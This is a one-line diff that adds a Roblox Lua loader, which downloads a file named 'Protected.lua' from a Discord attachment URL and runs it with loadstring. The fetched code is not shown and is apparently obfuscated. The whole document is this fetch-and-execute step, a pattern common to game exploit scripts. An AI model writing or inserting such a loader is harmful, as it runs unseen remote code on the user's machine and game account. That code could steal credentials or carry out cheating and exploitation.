@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://cdn.discordapp.com/attachments/922823751127683082/1007102754382168144/Protected.lua"))()
